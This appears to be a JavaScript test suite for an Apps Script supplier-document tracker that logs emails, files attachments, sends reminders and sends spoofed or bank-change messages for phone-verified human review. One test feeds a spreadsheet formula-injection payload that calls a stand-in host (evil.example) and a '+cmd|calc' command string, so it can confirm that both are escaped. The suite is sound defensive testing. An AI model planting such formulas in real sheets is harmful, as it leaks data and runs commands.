const test = require('node:test');
const assert = require('node:assert/strict');
const { loadAdapter, createMessage, createThread } = require('./helpers/gas-fakes');
const { suppliers, inbox } = require('../src/data/sample');

const HEADERS = ['id', 'name', 'domain', 'emails', 'contractId', 'contractEnd',
  'docsRequestedAt', 'docsReceivedAt', 'manualStatus', 'rutAt', 'chamberAt', 'bankLetterAt', 'policyAt', 'remindedAt'];
const DATE_FIELDS = ['contractEnd', 'docsRequestedAt', 'docsReceivedAt', 'rutAt', 'chamberAt', 'bankLetterAt', 'policyAt', 'remindedAt'];
const NOW = new Date('2026-09-29T17:00:00Z');
const ME = 'compras@miempresa.example';
const isDate = (v) => Object.prototype.toString.call(v) === '[object Date]';

// The supplier tab as Sheets returns it: Date objects and '' for empty cells.
function supplierSheet(headers = HEADERS) {
  return [headers, ...suppliers.map((s) => headers.map((h) => {
    if (h === 'emails') return s.emails.join(', ');
    if (DATE_FIELDS.includes(h)) return s[h] ? new Date(`${s[h]}T12:00:00Z`) : '';
    return s[h] || '';
  }))];
}

function inboxThreads() {
  const threads = inbox.map((mail) => createThread(`t-${mail.id}`, [createMessage({
    id: `m-${mail.id}`, from: mail.from, subject: mail.subject, body: mail.body,
    attachments: mail.attachments, date: new Date('2026-09-28T15:00:00Z'),
    auth: mail.senderVerified === false ? 'mx.google.com; spf=fail; dmarc=fail' : 'mx.google.com; spf=pass'
  })]));
  // Our own request plus the supplier's reply in the same thread.
  threads.push(createThread('t-request', [
    createMessage({ id: 'm-request', from: `Compras <${ME}>`, subject: 'Solicitud de documentos — contrato CT-2026-044',
      body: 'Por favor adjunten los documentos del contrato CT-2026-044.', date: new Date('2026-09-18T13:00:00Z') }),
    createMessage({ id: 'm-reply', from: 'seguridad@novagrupo.example', subject: 'RE: Solicitud de documentos — contrato CT-2026-044',
      body: 'Adjuntamos lo solicitado.', attachments: ['rut_nova.pdf'], date: new Date('2026-09-29T14:00:00Z') })
  ]));
  return threads;
}

function setup(options = {}) {
  const env = loadAdapter({
    ...options,
    sheets: { Proveedores: supplierSheet(options.headers) },
    threads: options.threads || inboxThreads(),
    me: ME,
    properties: { DRIVE_FOLDER_ID: 'folder-123' },
    now: NOW
  });
  env.cell = (id, field) => {
    const rows = env.book.Proveedores.data;
    return rows.find((r) => r[0] === id)[(options.headers || HEADERS).indexOf(field)];
  };
  env.folder = (id) => env.driveRoot.folders.find((f) => f.name.startsWith(`${id} — `));
  return env;
}

test('scanInbox logs each message once, files confirmed documents and queues the rest', () => {
  const env = setup();
  env.gas.scanInbox();

  const log = env.book['Registro'].data;
  assert.equal(log.length - 1, 13, 'twelve inbox emails + one reply; our own request is skipped');
  assert.ok(!log.some((r) => r[8] === 'm-request'));

  const review = env.book['Revisión'].data.slice(1);
  assert.deepEqual(review.map((r) => r[7]), ['m-E4', 'm-E5', 'm-E6', 'm-E10', 'm-E11', 'm-E12']);
  assert.match(review[3][4], /NO verificado/, 'spoofed sender goes to review, not confirmed');
  assert.match(review[4][4], /dominio parecido/, 'look-alike domain gets its own alert');
  assert.match(review[5][4], /confirmar por teléfono/, 'a bank change from the real address still goes to review');
  assert.deepEqual(review.map((r) => r[8]), ['', '', '', 'sí', 'sí', 'sí'], 'only risky rows require a phone check');
  assert.equal(review[0][4], '2 proveedores empatan con confianza media');

  for (const field of ['rutAt', 'chamberAt', 'bankLetterAt']) {
    assert.ok(isDate(env.cell('S01', field)), `S01 ${field} recorded from the attachment names`);
  }
  assert.ok(isDate(env.cell('S02', 'bankLetterAt')));
  assert.equal(env.cell('S02', 'rutAt'), '', 'only the documents that arrived are recorded');

  for (const id of ['S01', 'S02', 'S04', 'S06']) {
    assert.ok(isDate(env.cell(id, 'docsReceivedAt')), `${id} should have documents recorded`);
    assert.ok(env.folder(id).files.length > 0, `${id} should have a Drive folder with files`);
  }
  // A renewal proposal and a price list are filed, but they are not the requested documents.
  for (const id of ['S03', 'S09']) {
    assert.equal(env.cell(id, 'docsReceivedAt'), '', `${id}: unrecognised files do not count as documents`);
    assert.ok(env.folder(id).files.length > 0, `${id} attachments are still filed in Drive`);
  }
  assert.equal(env.cell('S05', 'docsReceivedAt'), '', 'review cases are not recorded automatically');

  const reply = env.gas.GmailApp.getMessageById('m-reply');
  assert.equal(env.cell('S06', 'docsReceivedAt'), reply.getDate());

  const threadLabels = Object.fromEntries(env.gas.GmailApp.search('', 0, 100).map((t) => [t.id, t.labels]));
  assert.deepEqual(threadLabels['t-E1'], ['Supplier Radar']);
  assert.deepEqual(threadLabels['t-E7'], [], 'unmatched newsletters are not labelled');

  env.gas.scanInbox();
  assert.equal(env.book['Registro'].data.length, log.length, 'a second run adds nothing');
  assert.equal(env.book['Revisión'].data.length - 1, 6);
});

test('a bank change or possible spoofing is applied only after a phone check, and the log says who decided', () => {
  const env = setup();
  env.gas.scanInbox();
  const review = env.book['Revisión'];
  const width = review.data[0].length;
  const row = review.data.findIndex((r) => r[7] === 'm-E12') + 1; // 1-based sheet row
  review.getRange(row, width - 1).setValue('S02');

  env.gas.applyReviewDecisions();
  assert.equal(review.data[row - 1][width - 1] || '', '', 'not applied without the phone check');
  assert.match(env.toasts.join(' '), /confirmar por teléfono/);

  review.getRange(row, width - 2).setValue('Ana, llamó al 601 del registro, 29-sep');
  env.gas.applyReviewDecisions();
  assert.match(review.data[row - 1][width - 1], /^asignado .* por compras@miempresa\.example$/);
  const last = env.book['Registro'].data.at(-1);
  assert.equal(last[3], 'asignado por una persona');
  assert.match(last[6], /Decidió: compras@miempresa\.example · verificado por llamada: Ana/);
});

test('sendReminders emails overdue suppliers once a week and needs the remindedAt column', () => {
  const env = setup();
  env.gas.sendReminders();
  env.gas.sendReminders();
  assert.deepEqual(env.sent.map((m) => m.to).sort(),
    ['compras@papeleriaandina.example', 'impresionesruiz.demo@gmail.com', 'limpieza@novagrupo.example']);
  assert.match(env.sent[0].body, /RUT, Cámara de comercio, Certificación bancaria/);
  assert.equal(env.cell('S07', 'remindedAt'), NOW);
  assert.equal(env.cell('S06', 'remindedAt').toISOString().slice(0, 10), '2026-09-26', 'reminded 3 days ago: not again');

  const old = setup({ headers: HEADERS.filter((h) => h !== 'remindedAt') });
  old.gas.sendReminders();
  assert.equal(old.sent.length, 0);
  assert.match(old.toasts[0], /remindedAt/);
});

test('applyReviewDecisions applies assignments once and reports unknown ids', () => {
  const env = setup();
  env.gas.scanInbox();
  const review = env.book['Revisión'];
  const assignColumn = review.data[0].length - 1; // 1-based index of "Asignar a"
  review.getRange(2, assignColumn).setValue('S07'); // E4: shared domain, a person picks the right company
  review.getRange(3, assignColumn).setValue('descartar'); // E5
  review.getRange(4, assignColumn).setValue('S99'); // E6: typo

  env.gas.applyReviewDecisions();
  env.gas.applyReviewDecisions();

  const applied = review.data.slice(1).map((r) => r[r.length - 1]);
  assert.match(applied[0], /^asignado /);
  assert.match(applied[1], /^descartado /);
  assert.equal(applied[2] || '', '');
  assert.ok(isDate(env.cell('S07', 'docsReceivedAt')));
  assert.deepEqual(env.folder('S07').files, ['camara.pdf'], 'attachments are filed exactly once');
  assert.equal(env.toasts.length, 2);
  assert.match(env.toasts[0], /S99/);
});

test('requestDocuments only emails suppliers that were never asked', () => {
  const env = setup();
  env.gas.requestDocuments();
  env.gas.requestDocuments();

  assert.deepEqual(env.sent.map((m) => m.to), ['despachos@transabana.example']);
  assert.equal(env.sent[0].subject, 'Solicitud de documentos — contrato CT-2026-052');
  assert.match(env.sent[0].body, /^Hola Transportes Sabana,/);
  assert.equal(env.cell('S09', 'docsRequestedAt'), NOW);
});

test('refreshDashboard computes KPIs from dates and flags stale manual statuses', () => {
  const env = setup();
  env.gas.refreshDashboard();

  const rows = env.book['Dashboard'].data;
  const kpi = Object.fromEntries(rows.slice(1, 5));
  assert.deepEqual(kpi, { 'Vencidos': 1, 'En riesgo': 4, 'Por vencer (30 días)': 2, 'Al día': 2 });
  const first = rows[7];
  assert.deepEqual(first, ['TecnoSoluciones Integrales', 'expired', -19, 'contrato vencido hace 19 días', 'sí',
    'RUT, Cámara de comercio, Certificación bancaria']);
});

test('email text that looks like a formula is written as plain text', () => {
  const threads = [createThread('t-x', [createMessage({
    id: 'm-x', from: '=IMPORTXML("https://evil.example/?"&A1,"//a")', subject: '+cmd|calc', body: '',
    date: new Date('2026-09-28T15:00:00Z')
  })])];
  const env = setup({ threads });
  env.gas.scanInbox();
  const row = env.book['Registro'].raw[1];
  assert.equal(row[1], `'=IMPORTXML("https://evil.example/?"&A1,"//a")`);
  assert.equal(row[2], "'+cmd|calc");
});

test('a message deleted from Gmail keeps its review row pending', () => {
  const env = setup();
  env.gas.scanInbox();
  const review = env.book['Revisión'];
  review.getRange(2, review.data[0].length - 1).setValue('S07');
  env.gas.GmailApp.getMessageById = () => null;
  env.gas.applyReviewDecisions();
  assert.equal(review.data[1][review.data[1].length - 1] || '', '');
  assert.match(env.toasts.join(' '), /ya no existen/);
});

test('a run is skipped while another execution holds the lock', () => {
  const env = setup({ lockFree: false });
  env.gas.scanInbox();
  assert.equal(env.book['Registro'], undefined);
});
